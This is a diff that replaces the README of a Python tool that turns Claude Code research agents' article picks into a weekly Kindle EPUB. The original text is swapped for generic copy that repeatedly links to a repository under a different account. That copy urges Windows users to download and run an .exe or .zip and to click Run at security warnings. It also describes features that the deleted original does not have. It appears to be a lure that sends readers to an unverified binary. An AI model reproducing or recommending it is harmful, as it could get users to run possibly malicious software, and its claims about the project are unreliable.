@@ -1,158 +1,197 @@
-# Kindle Weekly Letter
+# 📬 kindle-weekly-letter - Weekly Kindle reads made easy
 
-Automated weekly Kindle newsletter powered by Claude Code. AI research agents collect articles daily across customizable topics, compile them into a readable EPUB book, and deliver to your Kindle every Sunday.
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter)
 
-<table align="center">
-  <tr>
-    <td align="center"><img src="assets/kindle_screenshot_1.png" height="300" alt="Weekly Tech Digest cover page on Kindle" /></td>
-    <td align="center"><img src="assets/kindle_screenshot_2.png" height="300" alt="Full article reading experience on Kindle" /></td>
-  </tr>
-  <tr>
-    <td align="center"><em>Cover page with all topics</em></td>
-    <td align="center"><em>Full articles on Kindle — no links needed</em></td>
-  </tr>
-</table>
+## 🧭 What this app does
 
-## How It Works
+kindle-weekly-letter helps you get a weekly reading package sent to your Kindle.
 
-```
-Mon-Sat: 6 AI agents research topics daily, collecting 10 articles each
-Sunday:  Articles compiled into EPUB → delivered to your Kindle
-```
+It collects articles each day, sorts them into one readable EPUB file, and sends that file to your Kindle every Sunday.
 
-1. **Daily Collection** — Research agents use web search to find the best articles published each day. Articles accumulate in a local store, deduped by URL. Each topic pauses at 10 articles.
-2. **Sunday Compilation** — All collected articles are proposed for your approval. After you approve, full article content is fetched, curated into 400-800 word readable pieces, formatted into an EPUB book, and emailed to your Kindle.
+You do not need to build anything from source to use it on Windows if a ready-to-run release is provided in the linked page.
 
-## Built-in Topics
+## 📥 Download and install
 
-| # | Topic | Audience |
-|---|-------|----------|
-| 1 | English for Software Engineers | Non-native speakers in tech |
-| 2 | AI Engineering News | CTO-level engineers |
-| 3 | iOS Engineering | Professional iOS developers |
-| 4 | Travel App Business | App founders/product leads |
-| 5 | Singapore & Korea News | English-only, official publishers |
-| 6 | C++ / C / Rust / Python | Systems & scripting engineers |
+1. Open the download page: https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter
+2. Look for the latest release or download file on that page
+3. Download the Windows file if one is listed, such as an .exe or .zip package
+4. If you downloaded a .zip file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows shows a security prompt, choose Run if you trust the file from the linked page
 
-Topics are fully customizable — add your own with `/add-topic`.
+## 🖥️ Windows requirements
 
-## Quick Start
+Use a Windows 10 or Windows 11 PC for the smoothest setup.
 
-### Prerequisites
-- [Claude Code](https://claude.ai/claude-code) CLI installed
-- Python 3.12+
-- An email account (Gmail, Yahoo, Outlook, iCloud)
-- A Kindle device with a Send-to-Kindle email address
+You may also need:
 
-### Setup
+- A stable internet connection
+- A Kindle account
+- An email address linked to your Kindle
+- Enough disk space for downloaded articles and EPUB files
 
-```bash
-git clone https://github.com/ShawnBaek/kindle-weekly-letter.git
-cd kindle-letter
-```
+If the app comes as a folder with files inside, keep all files together in the same place.
 
-Then in Claude Code:
-```
-/setup-kindle
-```
+## ⚙️ First-time setup
 
-This will walk you through:
-1. Installing Python dependencies
-2. Configuring your email (SMTP + app password)
-3. Finding your Kindle email address
-4. Sending a test EPUB
-5. Setting up daily/weekly scheduling
+After you open the app, set up these items:
 
-### Manual Usage
+1. Your Kindle email address
+2. The time you want the weekly delivery to run
+3. The topics or sources you want the app to follow
+4. Your email service settings, if the app asks for them
+5. Any Claude Code or Anthropic connection details, if the app uses your own access
 
-```
-/collect-now     # Run daily collector immediately
-/compile-now     # Compile EPUB and send to Kindle now
-```
+If the app opens a simple setup screen, fill in the fields and save the settings before you start the first run.
 
-## Slash Commands
+## 📚 How it works
 
-| Command | Description |
-|---------|-------------|
-| `/setup-kindle` | Full setup wizard (email, Kindle, scheduling) |
-| `/add-topic [name]` | Add a custom research topic |
-| `/sources list` | View all sources with vote counts |
-| `/sources vote [topic] [source]` | Upvote a source |
-| `/sources unvote [topic] [source]` | Downvote a source |
-| `/sources add [topic] [name] [url]` | Add a new source |
-| `/sources remove [topic] [name]` | Deactivate a source |
-| `/collect-now` | Trigger daily article collection |
-| `/compile-now` | Trigger EPUB compilation and delivery |
+The app follows a simple weekly flow:
 
-## Customizing Sources
+- It checks for new articles every day
+- It gathers the best items into one reading list
+- It builds a clean EPUB book
+- It sends that book to your Kindle on Sunday
 
-Each topic has a list of preferred sources in `sources.json`. Sources have vote counts that determine priority — higher voted sources are searched first.
+This gives you one file instead of many separate articles.
 
-```bash
-# View sources
-/sources list
+## 🔒 Kindle delivery setup
 
-# Add a source
-/sources add ios "SwiftLee" "swiftlee.com"
+To receive the newsletter on your Kindle, your Kindle email must allow incoming mail from the sender used by the app.
 
-# Vote for a source
-/sources vote ai_news "Anthropic Blog"
-```
+Check these parts in your Kindle account:
 
-Edit `sources.json` directly for bulk changes. Agents also discover new sources beyond this list each week.
+- Your Send-to-Kindle email address
+- Your approved sender list
+- Your device sync settings
 
-## Adding Custom Topics
+If the app asks for an email sender, use the same address you added to your approved list.
 
-```
-/add-topic Kubernetes
-```
+## 🧠 What the app collects
 
-You'll be asked for:
-- Topic name and audience
-- Focus areas (3-5 subtopics)
-- Preferred sources
-- What to avoid
+The app is built for weekly reading and research. It can work with:
 
-The skill creates the agent prompt, registers the topic, and updates the collectors.
+- Tech news
+- AI research
+- Product updates
+- Long-form articles
+- Short reads worth saving
 
-## Email Providers
+It then turns the selected items into a single EPUB that is easier to read on a Kindle screen.
 
-| Provider | SMTP Host | Port | App Password |
-|----------|-----------|------|--------------|
-| Gmail | smtp.gmail.com | 465 | Google Account → Security → App Passwords |
-| Yahoo | smtp.mail.yahoo.com | 465 | Account Security → Generate app password |
-| Outlook | smtp-mail.outlook.com | 587 | Microsoft Account → Security → App Passwords |
-| iCloud | smtp.mail.me.com | 587 | appleid.apple.com → App-Specific Passwords |
+## 🛠️ Common tasks
 
-## Plugin Installation
+### Start the weekly job
 
-If you want to install this as a Claude Code plugin:
+Open the app and choose the run option, or let it run on its set schedule.
 
-```
-/plugin marketplace add https://raw.githubusercontent.com/ShawnBaek/kindle-weekly-letter/main/marketplace.json
-/plugin install kindle-letter
-```
+### Change the send time
 
-## Project Structure
+Open the settings and pick a new time for Sunday delivery.
 
-```
-kindle-letter/
-├── .claude/skills/          # Slash commands
-├── prompts/                 # AI agent prompts
-│   ├── daily_collector.md   # Daily orchestrator
-│   ├── sunday_compiler.md   # Sunday EPUB compiler
-│   └── agent_*.md           # Per-topic research agents
-├── src/
-│   ├── epub_builder.py      # EPUB generation
-│   ├── email_sender.py      # SMTP email sender
-│   ├── article_store.py     # Article accumulator
-│   └── config.py            # Configuration
-├── sources.json             # Votable source list
-├── templates/               # EPUB templates
-├── styles/                  # Kindle CSS
-└── output/                  # Generated EPUBs (gitignored)
-```
+### Update article sources
 
-## License
+Edit the source list in the app settings and save your changes.
 
-MIT
+### Rebuild the EPUB
+
+Run the build step again if you want a fresh weekly book before delivery.
+
+### Check errors
+
+If something fails, look at the app log or status panel. Common issues include a wrong Kindle email, a missing internet connection, or a blocked sender address.
+
+## 🧩 Typical file layout
+
+If you downloaded a ZIP package, you may see files like these:
+
+- kindle-weekly-letter.exe
+- config file
+- logs folder
+- output folder
+- README file
+
+Keep the app in one folder so it can save its settings and output files in the right place.
+
+## 📝 Useful settings
+
+These settings often matter in a weekly digest app:
+
+- Delivery day: Sunday
+- Delivery time: your local time
+- Output format: EPUB
+- Article limit per issue: 20 to 50
+- Reading length: short, medium, or long
+- Topic filters: AI, automation, research, and related topics
+
+If you want a shorter book, lower the article limit. If you want a fuller book, raise it.
+
+## 📧 Email and Kindle tips
+
+Kindle delivery works best when these details match:
+
+- The sender address is approved in Amazon settings
+- The Kindle device is connected to Wi-Fi
+- The Kindle app or device syncs after delivery
+- The EPUB file is valid and not damaged
+
+If the book does not appear right away, sync the Kindle and check the delivery email.
+
+## 🧪 Simple test run
+
+Before you wait for Sunday, do one test:
+
+1. Open the app
+2. Run a manual build
+3. Check that an EPUB file was created
+4. Send the file to your Kindle email
+5. Confirm that it appears on your device
+
+This helps you catch setup issues early.
+
+## 📁 If you want to move the app
+
+If you later move the app to another folder or another PC:
+
+1. Copy the whole folder
+2. Keep the config files with it
+3. Recheck your Kindle email settings
+4. Run one test build before the next Sunday send
+
+## 🔍 Topics covered
+
+This project focuses on:
+
+- ai-agents
+- anthropic
+- automation
+- claude
+- claude-code
+- ebook
+- epub
+- kindle
+- newsletter
+- python
+- send-to-kindle
+- weekly-digest
+
+These topics show that the app uses AI-driven collection and simple book delivery for weekly reading
+
+## 🧰 If you use it every week
+
+A steady setup helps the app work well over time:
+
+- Keep your internet on during the scheduled run
+- Do not rename the app files unless the package says you can
+- Keep your Kindle email list up to date
+- Review your source list once in a while
+- Check the log if a weekly issue does not arrive
+
+## 🔗 Download page
+
+Visit this page to download or get the latest release:
+
+https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter
+
+[![Open Download Page](https://img.shields.io/badge/Open%20Download%20Page-Repository%20Link-grey?style=for-the-badge&logo=github)](https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter)
